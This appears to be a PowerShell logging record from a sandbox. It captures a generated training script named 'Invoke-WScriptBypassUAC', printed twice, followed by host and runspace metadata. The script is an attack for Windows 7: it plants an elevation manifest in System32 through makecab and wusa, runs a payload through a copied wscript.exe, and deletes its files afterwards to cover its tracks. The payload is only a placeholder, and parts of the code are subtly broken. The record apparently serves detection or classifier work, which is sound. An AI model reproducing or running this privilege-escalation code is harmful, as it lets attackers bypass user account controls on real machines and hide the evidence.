EventData.Data:
function Invoke-WScriptBypassUAC { function DeleteFile { param( [string]$filePath ) $definition = @' using System; using System.Runtime.InteropServices; public class FileOps { [DllImport("kernel32.dll", SetLastError = true)] public static extern bool DeleteFile(string lpFileName); } '@ Add-Type -TypeDefinition $definition -Language CSharp [FileOps]::DeleteFile($filePath) }
$osVersion = [System.Environment]::OSVersion.Version $isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($osVersion.Major -eq 6 -and $osVersion.Minor -eq 1 -and !$isElevated) { $manifestContent = @" <?xml version=`"1.0`" encoding=`"UTF-8`" standalone=`"yes`"?> <assembly xmlns=`"urn:schemas-microsoft-com:asm.v1`" manifestVersion=`"1.0`"> <trustInfo xmlns=`"urn:schemas-microsoft-com:asm.v3`"> <security> <requestedPrivileges> <requestedExecutionLevel level=`"highestAvailable`" uiAccess=`"false`" /> </requestedPrivileges> </security> </trustInfo> </assembly> "@ $manifestPath = "$env:TEMP\custom.manifest" $manifestContent | Out-File -FilePath $manifestPath -Encoding ASCII
$wscriptPath = "$env:SystemRoot\System32\wscript.exe" $wscriptCopyPath = "$env:TEMP\wscript_copy.exe"
Copy-Item -Path $wscriptPath -Destination $wscriptCopyPath
& makecab.exe $manifestPath "$env:TEMP\custom.cab" & wusa.exe "$env:TEMP\custom.cab" /extract:"$env:SystemRoot\System32"
$payload = "Write-Host 'Running payload'" $payloadPath = "$env:APPDATA\payload.vbs" $payload | Out-File -FilePath $payloadPath -Encoding ASCII
$adsPath = "$env:APPDATA:payload.vbs" $adsStream = [IO.File]::OpenWrite($adsPath) $adsStream.Close()
$scriptBlock = [scriptblock]::Create($payload) Start-Process -FilePath $wscriptCopyPath -ArgumentList $payloadPath -Wait
DeleteFile -filePath $manifestPath DeleteFile -filePath "$env:TEMP\custom.cab" DeleteFile -filePath $wscriptCopyPath DeleteFile -filePath $payloadPath } }
Invoke-WScriptBypassUAC

function Invoke-WScriptBypassUAC { function DeleteFile { param( [string]$filePath ) $definition = @' using System; using System.Runtime.InteropServices; public class FileOps { [DllImport("kernel32.dll", SetLastError = true)] public static extern bool DeleteFile(string lpFileName); } '@ Add-Type -TypeDefinition $definition -Language CSharp [FileOps]::DeleteFile($filePath) }
$osVersion = [System.Environment]::OSVersion.Version $isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($osVersion.Major -eq 6 -and $osVersion.Minor -eq 1 -and !$isElevated) { $manifestContent = @" <?xml version=`"1.0`" encoding=`"UTF-8`" standalone=`"yes`"?> <assembly xmlns=`"urn:schemas-microsoft-com:asm.v1`" manifestVersion=`"1.0`"> <trustInfo xmlns=`"urn:schemas-microsoft-com:asm.v3`"> <security> <requestedPrivileges> <requestedExecutionLevel level=`"highestAvailable`" uiAccess=`"false`" /> </requestedPrivileges> </security> </trustInfo> </assembly> "@ $manifestPath = "$env:TEMP\custom.manifest" $manifestContent | Out-File -FilePath $manifestPath -Encoding ASCII
$wscriptPath = "$env:SystemRoot\System32\wscript.exe" $wscriptCopyPath = "$env:TEMP\wscript_copy.exe"
Copy-Item -Path $wscriptPath -Destination $wscriptCopyPath
& makecab.exe $manifestPath "$env:TEMP\custom.cab" & wusa.exe "$env:TEMP\custom.cab" /extract:"$env:SystemRoot\System32"
$payload = "Write-Host 'Running payload'" $payloadPath = "$env:APPDATA\payload.vbs" $payload | Out-File -FilePath $payloadPath -Encoding ASCII
$adsPath = "$env:APPDATA:payload.vbs" $adsStream = [IO.File]::OpenWrite($adsPath) $adsStream.Close()
$scriptBlock = [scriptblock]::Create($payload) Start-Process -FilePath $wscriptCopyPath -ArgumentList $payloadPath -Wait
DeleteFile -filePath $manifestPath DeleteFile -filePath "$env:TEMP\custom.cab" DeleteFile -filePath $wscriptCopyPath DeleteFile -filePath $payloadPath } }

Severity = Informational Host Name = ConsoleHost Host Version = 7.5.4 Host ID = 12931f9f-9607-41ed-8538-64ae2454b51e Host Application = C:\Program Files\PowerShell\7\pwsh.dll -NonInteractive -File C:\ProgramData\psandman\inputs\example_351_train_generated.ps1 Engine Version = 7.5.4 Runspace ID = 62691649-6071-423f-93ac-80e068da0713 Pipeline ID = 1 Command Name = example_351_train_generated.ps1 Command Type = ExternalScript Script Name = Command Path = C:\ProgramData\psandman\inputs\example_351_train_generated.ps1 Sequence Number = 8 User = DESKTOP-U2U3HDH\rizz Connected User = Shell ID = Microsoft.PowerShell
